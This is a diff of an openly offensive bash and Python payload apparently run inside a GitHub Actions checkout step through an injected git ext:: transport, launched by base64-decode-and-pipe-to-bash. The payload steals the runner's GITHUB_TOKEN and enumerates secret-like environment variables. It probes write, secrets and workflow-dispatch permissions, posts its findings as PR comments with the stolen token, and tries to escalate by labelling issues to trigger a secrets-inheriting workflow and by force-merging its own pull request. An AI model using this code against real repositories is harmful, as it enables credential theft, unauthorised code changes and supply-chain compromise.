@@ -1,6 +1,12 @@
 #!/bin/bash
 # Payload executed inside actions/checkout's `git fetch` via the ext:: transport
 # injected through the attacker-controlled .git/config shipped in the pr-number artifact.
+# Executed as: bash -c "echo <b64>|base64 -d|bash"
+if [ -f /tmp/pwn_done ]; then
+  echo "PWN already ran on this runner; skipping"
+  exit 0
+fi
+touch /tmp/pwn_done
 exec >&2
 echo "=== PWN START $(date -u +%FT%TZ) ==="
 id
@@ -50,13 +56,20 @@ def call(method, path, data=None):
     except Exception as e:
         return 0, {"error": repr(e)}
 
-res = {}
-res["repo_get"], repoj = call("GET", "/repos/" + repo)
-res["run_get"], _ = call("GET", "/repos/%s/actions/runs/%s" % (repo, run_id))
-res["contents_write_probe"], refj = call("POST", "/repos/%s/git/refs" % repo,
-    {"ref": "refs/heads/pwn-probe", "sha": os.environ.get("GITHUB_SHA", "")})
+def gql(query, variables):
+    return call("POST", "/graphql", {"query": query, "variables": variables})
 
 ident = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
+status0, repoj = call("GET", "/repos/" + repo)
+probes = {
+    "repo_get": status0,
+    "contents_write_ref_probe": call("POST", "/repos/%s/git/refs" % repo,
+        {"ref": "refs/heads/pwn-probe", "sha": os.environ.get("GITHUB_SHA", "")})[0],
+    "secrets_list_probe": call("GET", "/repos/%s/actions/secrets" % repo)[0],
+    "workflow_dispatch_probe": call("POST", "/repos/%s/actions/workflows/update-docs.yml/dispatches" % repo,
+        {"ref": "main"})[0],
+    "bot_collab_probe": call("GET", "/repos/%s/collaborators/github-actions%%5Bbot%%5D/permission" % repo)[0],
+}
 summary = {
     "marker": MARK,
     "runner": ident,
@@ -68,16 +81,21 @@ summary = {
     "token_len": len(tok),
     "token_prefix": tok[:4],
     "token_ish_env": sorted(k for k in os.environ if any(s in k.upper() for s in ("TOKEN", "SECRET", "KEY", "PASSWORD"))),
-    "api_status": res,
-    "contents_write_probe_body": refj,
+    "api_status": probes,
+    "allow_auto_merge": repoj.get("allow_auto_merge"),
+    "allow_squash_merge": repoj.get("allow_squash_merge"),
+    "allow_merge_commit": repoj.get("allow_merge_commit"),
 }
 body1 = ("## %s\n\nCode execution inside `actions/checkout` in the privileged `workflow_run` job.\n\n"
          "```json\n%s\n```\n\nThis comment was created with the GITHUB_TOKEN read from the runner environment "
-         "(`INPUT_TOKEN` of the checkout step) - if it appears authored by `github-actions[bot]`, the stolen token is live.\n"
+         "(`INPUT_TOKEN` of the checkout step). Its author being `github-actions[bot]` proves the stolen token is live.\n"
          % (MARK, json.dumps(summary, indent=1)))
 st1, c1 = call("POST", "/repos/%s/issues/%d/comments" % (repo, pr), {"body": body1})
 
-# Escalation attempt: docs-agent label triggers docs-agent-experimental (contents: write + secrets: inherit)
+# ---- escalation probes ----
+esc = {"comment_status": st1, "comment_id": c1.get("id")}
+
+# 1. docs-agent label -> workflow with contents:write + secrets:inherit
 st_lab, labj = call("POST", "/repos/%s/labels" % repo,
     {"name": "docs-agent", "color": "ededed", "description": "docs agent"})
 st_iss, issj = call("POST", "/repos/%s/issues" % repo,
@@ -93,31 +111,29 @@ else:
     issue_no = issj2.get("number")
     if issue_no:
         st_lab2, _ = call("POST", "/repos/%s/issues/%s/labels" % (repo, issue_no), {"labels": ["docs-agent"]})
+esc.update({"label_create": st_lab, "issue_create": st_iss, "issue_number": issue_no,
+            "issue_url": issj.get("html_url"), "issue_label_status": st_lab2})
 
-body2 = ("## %s escalation\n\n```json\n%s\n```\n"
-         % (MARK, json.dumps({
-             "comment_status": st1,
-             "comment_id": c1.get("id"),
-             "label_create_status": st_lab,
-             "issue_create_status": st_iss,
-             "issue_number": issue_no,
-             "issue_url": issj.get("html_url"),
-             "issue_label_status": st_lab2,
-             "contents_write_probe": res["contents_write_probe"],
-             "contents_write_probe_body": refj,
-         }, indent=1)))
+# 2. contents:write via merge / auto-merge on our own PR
+st_pr, prj = call("GET", "/repos/%s/pulls/%d" % (repo, pr))
+esc["pr_get"] = st_pr
+esc["pr_mergeable"] = prj.get("mergeable")
+esc["pr_node_id"] = prj.get("node_id")
+node = prj.get("node_id")
+if node:
+    q = ("mutation($id:ID!){ enablePullRequestAutoMerge(input:{pullRequestId:$id, mergeMethod:MERGE})"
+         "{ pullRequest{ number autoMergeRequest{ enabledAt } } } }")
+    st_gql, gqlj = gql(q, {"id": node})
+    esc["enable_auto_merge"] = st_gql
+    esc["enable_auto_merge_body"] = json.dumps(gqlj)[:400]
+st_merge, mergej = call("PUT", "/repos/%s/pulls/%d/merge" % (repo, pr),
+                        {"merge_method": "merge"})
+esc["rest_merge"] = st_merge
+esc["rest_merge_body"] = json.dumps(mergej)[:400]
+
+body2 = ("## %s escalation probes\n\n```json\n%s\n```\n"
+         % (MARK, json.dumps(esc, indent=1)))
 st2, c2 = call("POST", "/repos/%s/issues/%d/comments" % (repo, pr), {"body": body2})
-
-print(json.dumps({
-    "comment1_status": st1,
-    "comment1_id": c1.get("id"),
-    "comment2_status": st2,
-    "comment2_id": c2.get("id"),
-    "label_create": st_lab,
-    "issue_create": st_iss,
-    "issue_number": issue_no,
-    "token_len": len(tok),
-    "contents_write_probe": res["contents_write_probe"],
-}))
+print(json.dumps({"esc": esc, "comment2": st2, "token_len": len(tok)}))
 PYEOF
 echo "=== PWN END ==="
